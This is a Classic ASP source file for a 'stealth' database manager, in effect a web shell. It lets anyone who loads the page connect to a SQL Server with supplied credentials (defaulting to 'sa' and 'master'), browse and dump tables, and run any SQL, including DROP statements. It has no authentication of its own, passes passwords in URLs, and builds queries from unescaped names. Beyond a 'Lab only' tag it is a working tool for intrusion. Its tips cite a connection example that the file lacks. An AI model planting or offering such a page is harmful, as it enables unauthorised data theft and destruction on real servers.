<%@ Language=VBScript %>
<%
' Stealth Classic ASP DB Manager - Full Control via Form (Lab only!)

Dim Conn, RS, ConnStr
Dim ServerName, DBName, UserName, PassWord, Action, Query, TableName, SelectedDB

ServerName = Trim(Request("server") & Request.Form("server"))
DBName     = Trim(Request("dbname") & Request.Form("dbname"))
UserName   = Trim(Request("user") & Request.Form("user"))
PassWord   = Trim(Request("pass") & Request.Form("pass"))
Action     = Request("act")
Query      = Request("query")
TableName  = Request("tbl")
SelectedDB = Request("dbname")  ' For selected database

' Build ConnStr if credentials provided
If ServerName <> "" Then
    ConnStr = "Provider=SQLOLEDB;Data Source=" & ServerName & ";"
    If DBName <> "" Then ConnStr = ConnStr & "Initial Catalog=" & DBName & ";"
    ConnStr = ConnStr & "User ID=" & UserName & ";Password=" & PassWord & ";"
    
    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red;background:#300;padding:10px;border:2px solid red;'>Connection Error: " & Err.Description & " (Check details!)</div><br>"
        Set Conn = Nothing
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>Stealth DB Control - ASP</title></head>
<body style="font-family:consolas;background:#000;color:#0f0;margin:20px;">

<h2>Classic ASP DB Manager (Full Access - Enter Credentials)</h2>

<!-- Credentials Form -->
<form method="post">
    Server/IP: <input name="server" size="40" value="<%=Server.HTMLEncode(ServerName)%>" placeholder="127.0.0.1 or localhost"><br><br>
    Database: <input name="dbname" size="40" value="<%=Server.HTMLEncode(DBName)%>" placeholder="master (default)"><br><br>
    Username: <input name="user" size="40" value="<%=Server.HTMLEncode(UserName)%>" placeholder="sa"><br><br>
    Password: <input type="password" name="pass" size="40" value="<%=Server.HTMLEncode(PassWord)%>"><br><br>
    <input type="submit" value="Connect" style="padding:8px;background:#0f0;color:#000;border:none;">
</form>

<hr style="border-color:#333;">

<% If Conn Is Nothing Or Conn.State = 0 Then %>
    <p style="color:yellow;">Connect first using the form above. Use 'master' as DB if unsure.</p>
<% Else %>
    <div style="color:lime;background:#030;padding:10px;border:1px solid lime;">Connected! (Server: <%=ServerName%>, DB: <%=DBName%>)</div><br>

    <!-- Databases List (exclude system ones) -->
    <h3>Databases</h3>
    <%
    Set RS = Conn.Execute("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")
    Do While Not RS.EOF
        Dim dbLink : dbLink = "?act=tables&server=" & Server.URLEncode(ServerName) & "&user=" & Server.URLEncode(UserName) & "&pass=" & Server.URLEncode(PassWord) & "&dbname=" & Server.URLEncode(RS("name"))
        Response.Write "<a href='" & dbLink & "' style='color:#ff0;'>" & RS("name") & "</a><br>"
        RS.MoveNext
    Loop
    RS.Close
    %>

    <!-- Custom SQL Query -->
    <h3>Run Any SQL Query</h3>
    <form method="get">
        <input type="hidden" name="server" value="<%=Server.HTMLEncode(ServerName)%>">
        <input type="hidden" name="user" value="<%=Server.HTMLEncode(UserName)%>">
        <input type="hidden" name="pass" value="<%=Server.URLEncode(PassWord)%>">
        <input type="hidden" name="dbname" value="<%=Server.HTMLEncode(SelectedDB)%>">
        <input type="hidden" name="act" value="query">
        <input name="query" size="90" value="SELECT @@version"><br><br>
        <input type="submit" value="Execute Query" style="padding:8px;background:#0f0;color:#000;border:none;">
    </form>

    <% If Action = "query" And Query <> "" Then %>
        <h4>Result for: <%=Server.HTMLEncode(Query)%></h4>
        <%
        Set RS = Conn.Execute(Query)
        If Not RS.EOF Then
            Response.Write "<table border='1' cellspacing='0' cellpadding='5' style='border-color:#0f0;background:#111;'>"
            Response.Write "<tr style='background:#222;'>"
            For Each fld In RS.Fields
                Response.Write "<th>" & fld.Name & "</th>"
            Next
            Response.Write "</tr>"
            Dim cnt : cnt = 0
            Do While Not RS.EOF And cnt < 200
                Response.Write "<tr>"
                For Each fld In RS.Fields
                    Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
                Next
                Response.Write "</tr>"
                RS.MoveNext
                cnt = cnt + 1
            Loop
            Response.Write "</table>"
            If cnt >= 200 Then Response.Write "<p>(Showing first 200 rows only)</p>"
        Else
            Response.Write "<p style='color:yellow;'>Query OK (no data returned - like INSERT/UPDATE/DROP).</p>"
        End If
        RS.Close
        %>
    <% End If %>

    <!-- Tables in Selected DB -->
    <% If Action = "tables" And SelectedDB <> "" Then %>
        <h3>Tables in <%=Server.HTMLEncode(SelectedDB)%></h3>
        <%
        Conn.Execute "USE [" & SelectedDB & "]"
        Set RS = Conn.Execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_NAME")
        Do While Not RS.EOF
            Dim tblLink : tblLink = "?act=browse&server=" & Server.URLEncode(ServerName) & "&user=" & Server.URLEncode(UserName) & "&pass=" & Server.URLEncode(PassWord) & "&dbname=" & Server.URLEncode(SelectedDB) & "&tbl=" & Server.URLEncode(RS("TABLE_NAME"))
            Response.Write "<a href='" & tblLink & "' style='color:#0ff;'>" & RS("TABLE_NAME") & "</a><br>"
            RS.MoveNext
        Loop
        RS.Close
        %>
    <% End If %>

    <!-- Browse Table Data -->
    <% If Action = "browse" And TableName <> "" And SelectedDB <> "" Then %>
        <h3>Data in Table: <%=Server.HTMLEncode(TableName)%> (<%=Server.HTMLEncode(SelectedDB)%>)</h3>
        <%
        Conn.Execute "USE [" & SelectedDB & "]"
        Set RS = Conn.Execute("SELECT TOP 100 * FROM [" & TableName & "]")
        If Not RS.EOF Then
            Response.Write "<table border='1' cellspacing='0' cellpadding='5' style='border-color:#0f0;background:#111;'>"
            Response.Write "<tr style='background:#222;'>"
            For Each fld In RS.Fields
                Response.Write "<th>" & fld.Name & "</th>"
            Next
            Response.Write "</tr>"
            Do While Not RS.EOF
                Response.Write "<tr>"
                For Each fld In RS.Fields
                    Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
                Next
                Response.Write "</tr>"
                RS.MoveNext
            Loop
            Response.Write "</table>"
        Else
            Response.Write "<p style='color:yellow;'>Table empty or access issue.</p>"
        End If
        RS.Close
        %>
    <% End If %>

<% End If %>

<p style="color:#888;font-size:small;">
Tips: 
- Server blank chhod ke try kar agar local hai.<br>
- Trusted connection ke liye user/pass blank rakh aur Integrated Security=SSPI add kar ConnStr mein (code mein manually tweak kar).<br>
- MySQL/SQLite ke liye ConnStr change kar (comment mein example hai).<br>
- Agar tables nahi show ho rahe to custom query try kar: "SELECT * FROM INFORMATION_SCHEMA.TABLES"
</p>

</body>
</html>

<%
If Not RS Is Nothing Then If Not RS.EOF Then RS.Close
If Not Conn Is Nothing Then If Conn.State = 1 Then Conn.Close
Set RS = Nothing
Set Conn = Nothing
%>
